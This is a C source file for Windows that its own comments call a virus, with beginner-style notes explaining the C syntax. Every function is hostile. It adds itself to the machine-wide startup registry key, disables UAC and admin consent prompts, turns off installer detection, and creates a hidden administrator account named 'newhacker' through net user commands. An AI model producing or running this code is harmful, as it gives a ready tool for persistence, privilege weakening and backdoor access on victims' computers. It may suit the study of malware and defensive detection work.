#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <sys/types.h>
#include <winsock2.h>
#include <ws2tcpip.h>

/*

The virus should:

- Change registry values to make the system weaker
- Execute windows CLI commands to create a backdoor user

*/

void launchOnStartupFunction();
void disableUAC();
void disableInstallerDetection();
void createNewUserthroughCMD();


void main()
{

    launchOnStartupFunction();
    disableUAC();
    disableInstallerDetection();
    createNewUserthroughCMD();


}




// ------------------------------------------------ FUNCTION IMPLEMENTATIONS -----------------------------------------------------------------------------------------------



// have the target launch this application on startup
void launchOnStartupFunction()
{
    char exePath[256];
    DWORD pathLen = GetModuleFileNameA(NULL, exePath, 256);

    if (pathLen == 0) {
        printf("Failed to obtain the path of the application!\n");
    }

    char* registryPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    char* valueName = "(NotSo)InnocentProgram";

    HKEY hKey;

    LONG KeyOpenResult = RegOpenKeyExA(
            HKEY_LOCAL_MACHINE,
            registryPath,
            0,
            KEY_ALL_ACCESS,
            &hKey
            );

    if (KeyOpenResult != ERROR_SUCCESS) {
        printf("Error in accessing the first registry key!\n");
    }

    LONG ValueEditResult = RegSetValueExA(
            hKey,
            valueName,
            0,
            REG_SZ,
            // reminder - this is type casting to convert the string path to raw bytes so RegSetValueExA can recognise it
            (const BYTE*)exePath,

            // reminder - this finds the number of characters in the string, adds 1 to account for the null terminator \0 (added at the end of every string in C to tell the computer where the string stops) and type casts it to a DWORD to be handled by the function
            (DWORD)(strlen(exePath) + 1)

            );

    RegCloseKey(hKey);

}


// disables UAC and the dialogue asking if the user is sure when elevating privileges - grants admin rights to the malware without prompting the user
void disableUAC()
{


    HKEY hKeyTwo;
    char* registryPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    char* valueName = "EnableLUA"; // was 1 but this changed it to 0
    char* valueNameTwo = "ConsentPromptBehaviorAdmin"; // was 5 but this program aims to change it to 0
    DWORD numberToWrite = 0;

    LONG KeyOpenResult = RegOpenKeyExA(
                HKEY_LOCAL_MACHINE,
                registryPath,
                0,
                KEY_SET_VALUE,
                &hKeyTwo
                );
    if (KeyOpenResult != ERROR_SUCCESS) {
        if (KeyOpenResult == ERROR_ACCESS_DENIED) {
            printf("Access Denied: The current user token lacks sufficient permissions.\n");
        } else if (KeyOpenResult == ERROR_FILE_NOT_FOUND) {
            printf("The specified registry path does not exist.\n");
        } else {
            printf("Operation failed with Windows Error Code: %ld\n", KeyOpenResult);
    }
    }

    LONG ValueEditResult = RegSetValueExA(
                hKeyTwo,
                valueName,
                0,
                REG_DWORD,
                (const BYTE*)&numberToWrite, // reminder - not using & would mean you're telling windows to convert the value of 0 in the variable to a memory address and then search that memory address. Add the & sign to tell Windows to instead go to the memory location where the value of 0 is stored for this variable
                sizeof(numberToWrite)
                );

    if (ValueEditResult != ERROR_SUCCESS) {
        if (ValueEditResult == ERROR_ACCESS_DENIED) {
            printf("Access Denied: The current user token lacks sufficient permissions.\n");
        } else if (ValueEditResult == ERROR_FILE_NOT_FOUND) {
            printf("The specified registry path does not exist.\n");
        } else {
            printf("Operation failed with Windows Error Code: %ld\n", ValueEditResult);
    }
    }


    ValueEditResult = RegSetValueExA(
                hKeyTwo,
                valueNameTwo,
                0,
                REG_DWORD,
                (const BYTE*)&numberToWrite,
                sizeof(numberToWrite)
                );

    if (ValueEditResult != ERROR_SUCCESS) {
        if (ValueEditResult == ERROR_ACCESS_DENIED) {
            printf("Access Denied: The current user token lacks sufficient permissions.\n");
        } else if (ValueEditResult == ERROR_FILE_NOT_FOUND) {
            printf("The specified registry path does not exist.\n");
        } else {
            printf("Operation failed with Windows Error Code: %ld\n", ValueEditResult);
    }
    }

    RegCloseKey(hKeyTwo);
}

// disables Installer detection to allow application installations without elevation prompts, allowing for unauthorised installations
void disableInstallerDetection()
{

    HKEY hKeyThree;
    char* registryPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    char* valueName = "EnableInstallerDetection"; // was 1 but this changed it to 0
    DWORD numberToWrite = 0;

    LONG KeyOpenResult = RegOpenKeyExA(
                HKEY_LOCAL_MACHINE,
                registryPath,
                0,
                KEY_SET_VALUE,
                &hKeyThree
                );
    if (KeyOpenResult != ERROR_SUCCESS) {
        if (KeyOpenResult == ERROR_ACCESS_DENIED) {
            printf("Access Denied: The current user token lacks sufficient permissions.\n");
        } else if (KeyOpenResult == ERROR_FILE_NOT_FOUND) {
            printf("The specified registry path does not exist.\n");
        } else {
            printf("Operation failed with Windows Error Code: %ld\n", KeyOpenResult);
    }
    }

    LONG ValueEditResult = RegSetValueExA(
                hKeyThree,
                valueName,
                0,
                REG_DWORD,
                (const BYTE*)&numberToWrite,
                sizeof(numberToWrite)
                );

    if (ValueEditResult != ERROR_SUCCESS) {
        if (ValueEditResult == ERROR_ACCESS_DENIED) {
            printf("Access Denied: The current user token lacks sufficient permissions.\n");
        } else if (ValueEditResult == ERROR_FILE_NOT_FOUND) {
            printf("The specified registry path does not exist.\n");
        } else {
            printf("Operation failed with Windows Error Code: %ld\n", ValueEditResult);
    }
    }



    RegCloseKey(hKeyThree);
}


// create a new administrative backdoor user through CMD commands
void createNewUserthroughCMD()
{
    system("net user newhacker /add >nul");
    system("net localgroup administrators newhacker /add >nul");
}
